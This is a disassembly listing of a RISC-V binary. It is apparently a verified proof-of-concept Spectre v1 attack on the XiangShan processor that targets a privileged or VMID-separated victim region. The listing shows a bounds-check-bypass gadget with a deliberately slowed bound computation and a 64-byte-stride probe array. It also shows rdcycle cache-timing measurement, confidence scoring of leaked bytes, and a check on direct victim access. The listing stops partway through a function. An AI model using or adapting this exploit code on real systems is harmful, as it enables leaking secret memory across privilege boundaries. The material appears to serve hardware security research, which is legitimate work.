
/nfs/home/leizhenyu/opt/verified_poc/xiangshan-v2/spectre-v1-vmid-kmhv2/code/build/spectre-v1-vmid-priv-riscv64-xs.elf:     file format elf64-littleriscv


Disassembly of section .text:

0000000080000000 <_start>:
    80000000:	00000093          	li	ra,0
    8000154a:	6446                	ld	s0,80(sp)
    8000154c:	6125                	addi	sp,sp,96
    8000154e:	8082                	ret
	...

Disassembly of section .u_text:

0000000080002000 <candidate_value>:
    80002000:	1101                	addi	sp,sp,-32
    80002002:	ec22                	sd	s0,24(sp)
    80002004:	1000                	addi	s0,sp,32
    80002006:	fea43423          	sd	a0,-24(s0)
    8000200a:	fe843703          	ld	a4,-24(s0)
    8000200e:	47a5                	li	a5,9
    80002010:	00e7e763          	bltu	a5,a4,8000201e <candidate_value+0x1e>
    80002014:	fe843783          	ld	a5,-24(s0)
    80002018:	03078793          	addi	a5,a5,48
    8000201c:	a005                	j	8000203c <candidate_value+0x3c>
    8000201e:	fe843703          	ld	a4,-24(s0)
    80002022:	02300793          	li	a5,35
    80002026:	00e7e763          	bltu	a5,a4,80002034 <candidate_value+0x34>
    8000202a:	fe843783          	ld	a5,-24(s0)
    8000202e:	03778793          	addi	a5,a5,55
    80002032:	a029                	j	8000203c <candidate_value+0x3c>
    80002034:	fe843783          	ld	a5,-24(s0)
    80002038:	03d78793          	addi	a5,a5,61
    8000203c:	853e                	mv	a0,a5
    8000203e:	6462                	ld	s0,24(sp)
    80002040:	6105                	addi	sp,sp,32
    80002042:	8082                	ret
    80002044:	00000013          	nop
    80002048:	00000013          	nop
    8000204c:	00000013          	nop

0000000080002050 <candidate_probe_value>:
    80002050:	1101                	addi	sp,sp,-32
    80002052:	ec06                	sd	ra,24(sp)
    80002054:	e822                	sd	s0,16(sp)
    80002056:	1000                	addi	s0,sp,32
    80002058:	fea43423          	sd	a0,-24(s0)
    8000205c:	fe843703          	ld	a4,-24(s0)
    80002060:	87ba                	mv	a5,a4
    80002062:	0792                	slli	a5,a5,0x4
    80002064:	97ba                	add	a5,a5,a4
    80002066:	00d78713          	addi	a4,a5,13
    8000206a:	03e00793          	li	a5,62
    8000206e:	02f777b3          	remu	a5,a4,a5
    80002072:	853e                	mv	a0,a5
    80002074:	f8dff0ef          	jal	80002000 <candidate_value>
    80002078:	87aa                	mv	a5,a0
    8000207a:	853e                	mv	a0,a5
    8000207c:	60e2                	ld	ra,24(sp)
    8000207e:	6442                	ld	s0,16(sp)
    80002080:	6105                	addi	sp,sp,32
    80002082:	8082                	ret
    80002084:	00000013          	nop
    80002088:	00000013          	nop
    8000208c:	00000013          	nop

0000000080002090 <is_training_value>:
    80002090:	7179                	addi	sp,sp,-48
    80002092:	f422                	sd	s0,40(sp)
    80002094:	1800                	addi	s0,sp,48
    80002096:	fca43c23          	sd	a0,-40(s0)
    8000209a:	4785                	li	a5,1
    8000209c:	fef43423          	sd	a5,-24(s0)
    800020a0:	a831                	j	800020bc <is_training_value+0x2c>
    800020a2:	fd843703          	ld	a4,-40(s0)
    800020a6:	fe843783          	ld	a5,-24(s0)
    800020aa:	00f71463          	bne	a4,a5,800020b2 <is_training_value+0x22>
    800020ae:	4785                	li	a5,1
    800020b0:	a821                	j	800020c8 <is_training_value+0x38>
    800020b2:	fe843783          	ld	a5,-24(s0)
    800020b6:	0785                	addi	a5,a5,1
    800020b8:	fef43423          	sd	a5,-24(s0)
    800020bc:	fe843703          	ld	a4,-24(s0)
    800020c0:	47c1                	li	a5,16
    800020c2:	fee7f0e3          	bgeu	a5,a4,800020a2 <is_training_value+0x12>
    800020c6:	4781                	li	a5,0
    800020c8:	853e                	mv	a0,a5
    800020ca:	7422                	ld	s0,40(sp)
    800020cc:	6145                	addi	sp,sp,48
    800020ce:	8082                	ret

00000000800020d0 <is_known_noise_value>:
    800020d0:	1101                	addi	sp,sp,-32
    800020d2:	ec22                	sd	s0,24(sp)
    800020d4:	1000                	addi	s0,sp,32
    800020d6:	fea43423          	sd	a0,-24(s0)
    800020da:	fe843703          	ld	a4,-24(s0)
    800020de:	07100793          	li	a5,113
    800020e2:	04f70063          	beq	a4,a5,80002122 <is_known_noise_value+0x52>
    800020e6:	fe843703          	ld	a4,-24(s0)
    800020ea:	07700793          	li	a5,119
    800020ee:	02f70a63          	beq	a4,a5,80002122 <is_known_noise_value+0x52>
    800020f2:	fe843703          	ld	a4,-24(s0)
    800020f6:	03400793          	li	a5,52
    800020fa:	02f70463          	beq	a4,a5,80002122 <is_known_noise_value+0x52>
    800020fe:	fe843703          	ld	a4,-24(s0)
    80002102:	03500793          	li	a5,53
    80002106:	00f70e63          	beq	a4,a5,80002122 <is_known_noise_value+0x52>
    8000210a:	fe843703          	ld	a4,-24(s0)
    8000210e:	03600793          	li	a5,54
    80002112:	00f70863          	beq	a4,a5,80002122 <is_known_noise_value+0x52>
    80002116:	fe843703          	ld	a4,-24(s0)
    8000211a:	03700793          	li	a5,55
    8000211e:	00f71463          	bne	a4,a5,80002126 <is_known_noise_value+0x56>
    80002122:	4785                	li	a5,1
    80002124:	a011                	j	80002128 <is_known_noise_value+0x58>
    80002126:	4781                	li	a5,0
    80002128:	853e                	mv	a0,a5
    8000212a:	6462                	ld	s0,24(sp)
    8000212c:	6105                	addi	sp,sp,32
    8000212e:	8082                	ret

0000000080002130 <top_two_idx>:
    80002130:	7139                	addi	sp,sp,-64
    80002132:	fc22                	sd	s0,56(sp)
    80002134:	0080                	addi	s0,sp,64
    80002136:	fca43c23          	sd	a0,-40(s0)
    8000213a:	fcb43823          	sd	a1,-48(s0)
    8000213e:	fcc43423          	sd	a2,-56(s0)
    80002142:	fcd43023          	sd	a3,-64(s0)
    80002146:	fc843783          	ld	a5,-56(s0)
    8000214a:	00078023          	sb	zero,0(a5)
    8000214e:	fc843783          	ld	a5,-56(s0)
    80002152:	0785                	addi	a5,a5,1
    80002154:	00078023          	sb	zero,0(a5)
    80002158:	fc043783          	ld	a5,-64(s0)
    8000215c:	0007b023          	sd	zero,0(a5)
    80002160:	fc043783          	ld	a5,-64(s0)
    80002164:	07a1                	addi	a5,a5,8
    80002166:	0007b023          	sd	zero,0(a5)
    8000216a:	fe043423          	sd	zero,-24(s0)
    8000216e:	a075                	j	8000221a <top_two_idx+0xea>
    80002170:	fe843783          	ld	a5,-24(s0)
    80002174:	078e                	slli	a5,a5,0x3
    80002176:	fd843703          	ld	a4,-40(s0)
    8000217a:	97ba                	add	a5,a5,a4
    8000217c:	6398                	ld	a4,0(a5)
    8000217e:	fc043783          	ld	a5,-64(s0)
    80002182:	639c                	ld	a5,0(a5)
    80002184:	04e7f563          	bgeu	a5,a4,800021ce <top_two_idx+0x9e>
    80002188:	fc043783          	ld	a5,-64(s0)
    8000218c:	07a1                	addi	a5,a5,8
    8000218e:	fc043703          	ld	a4,-64(s0)
    80002192:	6318                	ld	a4,0(a4)
    80002194:	e398                	sd	a4,0(a5)
    80002196:	fc843783          	ld	a5,-56(s0)
    8000219a:	0785                	addi	a5,a5,1
    8000219c:	fc843703          	ld	a4,-56(s0)
    800021a0:	00074703          	lbu	a4,0(a4)
    800021a4:	00e78023          	sb	a4,0(a5)
    800021a8:	fe843783          	ld	a5,-24(s0)
    800021ac:	078e                	slli	a5,a5,0x3
    800021ae:	fd843703          	ld	a4,-40(s0)
    800021b2:	97ba                	add	a5,a5,a4
    800021b4:	6398                	ld	a4,0(a5)
    800021b6:	fc043783          	ld	a5,-64(s0)
    800021ba:	e398                	sd	a4,0(a5)
    800021bc:	fe843783          	ld	a5,-24(s0)
    800021c0:	0ff7f713          	zext.b	a4,a5
    800021c4:	fc843783          	ld	a5,-56(s0)
    800021c8:	00e78023          	sb	a4,0(a5)
    800021cc:	a091                	j	80002210 <top_two_idx+0xe0>
    800021ce:	fe843783          	ld	a5,-24(s0)
    800021d2:	078e                	slli	a5,a5,0x3
    800021d4:	fd843703          	ld	a4,-40(s0)
    800021d8:	97ba                	add	a5,a5,a4
    800021da:	6398                	ld	a4,0(a5)
    800021dc:	fc043783          	ld	a5,-64(s0)
    800021e0:	07a1                	addi	a5,a5,8
    800021e2:	639c                	ld	a5,0(a5)
    800021e4:	02e7f663          	bgeu	a5,a4,80002210 <top_two_idx+0xe0>
    800021e8:	fe843783          	ld	a5,-24(s0)
    800021ec:	078e                	slli	a5,a5,0x3
    800021ee:	fd843703          	ld	a4,-40(s0)
    800021f2:	973e                	add	a4,a4,a5
    800021f4:	fc043783          	ld	a5,-64(s0)
    800021f8:	07a1                	addi	a5,a5,8
    800021fa:	6318                	ld	a4,0(a4)
    800021fc:	e398                	sd	a4,0(a5)
    800021fe:	fc843783          	ld	a5,-56(s0)
    80002202:	0785                	addi	a5,a5,1
    80002204:	fe843703          	ld	a4,-24(s0)
    80002208:	0ff77713          	zext.b	a4,a4
    8000220c:	00e78023          	sb	a4,0(a5)
    80002210:	fe843783          	ld	a5,-24(s0)
    80002214:	0785                	addi	a5,a5,1
    80002216:	fef43423          	sd	a5,-24(s0)
    8000221a:	fe843703          	ld	a4,-24(s0)
    8000221e:	fd043783          	ld	a5,-48(s0)
    80002222:	f4f767e3          	bltu	a4,a5,80002170 <top_two_idx+0x40>
    80002226:	0001                	nop
    80002228:	0001                	nop
    8000222a:	7462                	ld	s0,56(sp)
    8000222c:	6121                	addi	sp,sp,64
    8000222e:	8082                	ret

0000000080002230 <enough_confidence>:
    80002230:	7139                	addi	sp,sp,-64
    80002232:	fc06                	sd	ra,56(sp)
    80002234:	f822                	sd	s0,48(sp)
    80002236:	0080                	addi	s0,sp,64
    80002238:	fca43423          	sd	a0,-56(s0)
    8000223c:	fd840713          	addi	a4,s0,-40
    80002240:	fe840793          	addi	a5,s0,-24
    80002244:	86ba                	mv	a3,a4
    80002246:	863e                	mv	a2,a5
    80002248:	10000593          	li	a1,256
    8000224c:	fc843503          	ld	a0,-56(s0)
    80002250:	ee1ff0ef          	jal	80002130 <top_two_idx>
    80002254:	fd843703          	ld	a4,-40(s0)
    80002258:	4789                	li	a5,2
    8000225a:	00e7fb63          	bgeu	a5,a4,80002270 <enough_confidence+0x40>
    8000225e:	fd843703          	ld	a4,-40(s0)
    80002262:	fe043783          	ld	a5,-32(s0)
    80002266:	0789                	addi	a5,a5,2
    80002268:	00f76463          	bltu	a4,a5,80002270 <enough_confidence+0x40>
    8000226c:	4785                	li	a5,1
    8000226e:	a011                	j	80002272 <enough_confidence+0x42>
    80002270:	4781                	li	a5,0
    80002272:	853e                	mv	a0,a5
    80002274:	70e2                	ld	ra,56(sp)
    80002276:	7442                	ld	s0,48(sp)
    80002278:	6121                	addi	sp,sp,64
    8000227a:	8082                	ret
    8000227c:	00000013          	nop

0000000080002280 <u_probe_time>:
    80002280:	7139                	addi	sp,sp,-64
    80002282:	fc22                	sd	s0,56(sp)
    80002284:	0080                	addi	s0,sp,64
    80002286:	fca43423          	sd	a0,-56(s0)
    8000228a:	fc843783          	ld	a5,-56(s0)
    8000228e:	0330000f          	fence	rw,rw
    80002292:	c0002673          	rdcycle	a2
    80002296:	0007c703          	lbu	a4,0(a5)
    8000229a:	0330000f          	fence	rw,rw
    8000229e:	c00026f3          	rdcycle	a3
    800022a2:	fec43423          	sd	a2,-24(s0)
    800022a6:	fed43023          	sd	a3,-32(s0)
    800022aa:	fce40fa3          	sb	a4,-33(s0)
    800022ae:	fe043703          	ld	a4,-32(s0)
    800022b2:	fe843783          	ld	a5,-24(s0)
    800022b6:	40f707b3          	sub	a5,a4,a5
    800022ba:	853e                	mv	a0,a5
    800022bc:	7462                	ld	s0,56(sp)
    800022be:	6121                	addi	sp,sp,64
    800022c0:	8082                	ret
    800022c2:	0001                	nop
    800022c4:	00000013          	nop
    800022c8:	00000013          	nop
    800022cc:	00000013          	nop

00000000800022d0 <probe_direct_victim_access>:
    800022d0:	1101                	addi	sp,sp,-32
    800022d2:	ec22                	sd	s0,24(sp)
    800022d4:	1000                	addi	s0,sp,32
    800022d6:	fe043423          	sd	zero,-24(s0)
    800022da:	0000e797          	auipc	a5,0xe
    800022de:	d2678793          	addi	a5,a5,-730 # 80010000 <direct_victim_fault_seen>
    800022e2:	0007b023          	sd	zero,0(a5)
    800022e6:	0000f797          	auipc	a5,0xf
    800022ea:	d1a78793          	addi	a5,a5,-742 # 80011000 <direct_victim_read_completed>
    800022ee:	0007b023          	sd	zero,0(a5)
    800022f2:	00010797          	auipc	a5,0x10
    800022f6:	d0e78793          	addi	a5,a5,-754 # 80012000 <direct_victim_read_value>
    800022fa:	0007b023          	sd	zero,0(a5)
    800022fe:	0000d797          	auipc	a5,0xd
    80002302:	d0278793          	addi	a5,a5,-766 # 8000f000 <direct_victim_fault_expected>
    80002306:	4705                	li	a4,1
    80002308:	e398                	sd	a4,0(a5)
    8000230a:	00016717          	auipc	a4,0x16
    8000230e:	d4670713          	addi	a4,a4,-698 # 80018050 <victim_region+0x50>
    80002312:	00074783          	lbu	a5,0(a4)
    80002316:	fef43423          	sd	a5,-24(s0)
    8000231a:	0000d797          	auipc	a5,0xd
    8000231e:	ce678793          	addi	a5,a5,-794 # 8000f000 <direct_victim_fault_expected>
    80002322:	0007b023          	sd	zero,0(a5)
    80002326:	0000e797          	auipc	a5,0xe
    8000232a:	cda78793          	addi	a5,a5,-806 # 80010000 <direct_victim_fault_seen>
    8000232e:	639c                	ld	a5,0(a5)
    80002330:	ef91                	bnez	a5,8000234c <probe_direct_victim_access+0x7c>
    80002332:	00010797          	auipc	a5,0x10
    80002336:	cce78793          	addi	a5,a5,-818 # 80012000 <direct_victim_read_value>
    8000233a:	fe843703          	ld	a4,-24(s0)
    8000233e:	e398                	sd	a4,0(a5)
    80002340:	0000f797          	auipc	a5,0xf
    80002344:	cc078793          	addi	a5,a5,-832 # 80011000 <direct_victim_read_completed>
    80002348:	4705                	li	a4,1
    8000234a:	e398                	sd	a4,0(a5)
    8000234c:	0001                	nop
    8000234e:	6462                	ld	s0,24(sp)
    80002350:	6105                	addi	sp,sp,32
    80002352:	8082                	ret
    80002354:	00000013          	nop
    80002358:	00000013          	nop
    8000235c:	00000013          	nop

0000000080002360 <victim_process_gadget>:
    80002360:	7139                	addi	sp,sp,-64
    80002362:	fc22                	sd	s0,56(sp)
    80002364:	0080                	addi	s0,sp,64
    80002366:	fca43423          	sd	a0,-56(s0)
    8000236a:	fcb43023          	sd	a1,-64(s0)
    8000236e:	00016797          	auipc	a5,0x16
    80002372:	c9278793          	addi	a5,a5,-878 # 80018000 <victim_region>
    80002376:	fef43423          	sd	a5,-24(s0)
    8000237a:	00017797          	auipc	a5,0x17
    8000237e:	c8678793          	addi	a5,a5,-890 # 80019000 <victim_array1_sz>
    80002382:	fef43023          	sd	a5,-32(s0)
    80002386:	fc043783          	ld	a5,-64(s0)
    8000238a:	fcf43c23          	sd	a5,-40(s0)
    8000238e:	fc843783          	ld	a5,-56(s0)
    80002392:	fe843703          	ld	a4,-24(s0)
    80002396:	fe043683          	ld	a3,-32(s0)
    8000239a:	fd843603          	ld	a2,-40(s0)
    8000239e:	0006b283          	ld	t0,0(a3)
    800023a2:	0292                	slli	t0,t0,0x4
    800023a4:	4f89                	li	t6,2
    800023a6:	03f2d2b3          	divu	t0,t0,t6
    800023aa:	03f2d2b3          	divu	t0,t0,t6
    800023ae:	03f2d2b3          	divu	t0,t0,t6
    800023b2:	03f2d2b3          	divu	t0,t0,t6
    800023b6:	0057e363          	bltu	a5,t0,800023bc <victim_process_gadget+0x5c>
    800023ba:	a005                	j	800023da <victim_process_gadget+0x7a>
    800023bc:	00f70333          	add	t1,a4,a5
    800023c0:	00034383          	lbu	t2,0(t1)
    800023c4:	039a                	slli	t2,t2,0x6
    800023c6:	00760e33          	add	t3,a2,t2
    800023ca:	000e4e83          	lbu	t4,0(t3)
    800023ce:	00015f17          	auipc	t5,0x15
    800023d2:	c32f0f13          	addi	t5,t5,-974 # 80017000 <m_dummy>
    800023d6:	01df0023          	sb	t4,0(t5)
    800023da:	0001                	nop
    800023dc:	7462                	ld	s0,56(sp)
    800023de:	6121                	addi	sp,sp,64
    800023e0:	8082                	ret
    800023e2:	0001                	nop
    800023e4:	00000013          	nop
    800023e8:	00000013          	nop
    800023ec:	00000013          	nop

00000000800023f0 <victim_process_entry>:
    800023f0:	1141                	addi	sp,sp,-16
    800023f2:	e406                	sd	ra,8(sp)
    800023f4:	e022                	sd	s0,0(sp)
    800023f6:	0800                	addi	s0,sp,16
    800023f8:	00018797          	auipc	a5,0x18
    800023fc:	c0878793          	addi	a5,a5,-1016 # 8001a000 <victim_arg_idx>
    80002400:	6398                	ld	a4,0(a5)
    80002402:	00019797          	auipc	a5,0x19
    80002406:	bfe78793          	addi	a5,a5,-1026 # 8001b000 <victim_arg_probe>
    8000240a:	639c                	ld	a5,0(a5)
    8000240c:	85be                	mv	a1,a5
    8000240e:	853a                	mv	a0,a4
    80002410:	f51ff0ef          	jal	80002360 <victim_process_gadget>
    80002414:	4891                	li	a7,4
    80002416:	00000073          	ecall
    8000241a:	10500073          	wfi
    8000241e:	bff5                	j	8000241a <victim_process_entry+0x2a>

0000000080002420 <svc_victim>:
    80002420:	1101                	addi	sp,sp,-32
    80002422:	ec22                	sd	s0,24(sp)
